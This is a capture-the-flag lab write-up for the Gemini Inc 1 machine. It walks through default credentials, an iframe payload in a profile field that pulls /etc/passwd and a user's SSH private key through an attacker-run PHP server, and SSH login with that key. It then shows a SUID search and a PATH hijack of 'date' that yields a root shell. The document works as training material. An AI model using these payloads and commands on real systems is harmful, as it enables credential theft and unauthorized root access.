# Exercise 1: Gemini Inc 1

Nmap full scan:  
![](media/0c35fc92dc7bd6537aefc0e5f04dd7ac.png)

Webpage:  
![Graphical user interface, text, application, email Description automatically generated](media/46937ae4f874c04e6e5dd78ecb2ce57e.png)

Check master-login-system default credentials

Github page links to a youtube video: <https://www.youtube.com/watch?v=y7SdQfZfLbA>

At 1:13, it shows a user ‘admin’ and password ‘1234’, which worked when logging into the site. Did not work when logging into ssh

I was stuck, so I followed the walkthrough <https://www.hackingarticles.in/hack-the-gemini-inc-ctf-challenge/>

Create index.php file:  
![](media/be116ce1093de3da73b5284af64139e6.png)

Run a php server at the same directory as index.php file: php -S 0.0.0.0:4444

In Actions -\> Edit profile, set display name as the following:  
\<iframe height="1000" width="800" src="http://192.168.50.5:4444/?file=/etc/passwd"\>\</iframe\>

where the 192.168.x.x is our Kali IP

Go back to profile and go to Actions -\> Export profile

![Text Description automatically generated](media/8f56b31c8d842cbda8e7d185e24cd177.png)

Gemini1, UID 1000

Go back to Actions -\> Edit profile and set new display name as:

\<iframe height="1000" width="800" src="http://192.168.50.5:4444/?file=/home/gemini1/.ssh/id_rsa"\>\</iframe\>

![Text Description automatically generated](media/bc7d178c2dcae9e0793d32ec9d0eeaeb.png)

We have the private RSA key for user Gemini1. We save this into a file login_rsa

Then, run ssh: ssh -i login_rsa [gemini1@192.168.50.18](mailto:gemini1@192.168.50.18) on the same directory as login_rsa file

find / -perm -u=s -type f 2\>/dev/null

to find any possible privilege escalation entry via SUID permissions

![](media/b3627d6b2422053c947c16cf932c1f6e.png)

Explore listinfo:  
![Graphical user interface Description automatically generated with medium confidence](media/0129fd2a1630353d59a6099a1f389ffd.png)

It calls date and netstat.

Execute:

cd /tmp   
echo "/bin/sh" \> date  
chmod 777 date  
echo \$PATH  
export PATH=/tmp:\$PATH  
/usr/bin/listinfo

![Text Description automatically generated](media/835faf7e6cd78b0f362a49a60152e203.png)
